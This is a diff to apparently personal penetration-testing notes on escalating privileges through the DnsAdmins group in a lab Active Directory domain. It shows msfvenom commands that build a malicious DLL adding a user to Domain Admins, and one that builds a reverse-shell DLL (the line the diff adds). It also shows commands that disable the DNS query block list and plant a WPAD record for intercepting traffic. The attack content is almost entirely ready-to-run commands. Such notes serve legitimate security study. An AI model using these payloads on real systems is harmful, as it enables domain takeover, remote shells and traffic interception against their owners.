@@ -64,6 +64,7 @@ DNS Admins
 		Running the exploit:
 			Generate malicious DLL:
 				`msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll'
+				`msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT= --platform=windows -f dll > reverseshell.dll`
 			Transfer file across to target 
 			Load DLL as Non-Privileged User:
 				Only DnsAdmins can do this.
@@ -104,6 +105,4 @@ DNS Admins
 					`Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local`
 				Add a WDAP record 
 					`Add-DnsServerResourceRecordA -Name wpad -ZoneName <domain name>.local -ComputerName dc01.<domain name>.local -IPv4Address <ip>`
-					
-				
-			
+s
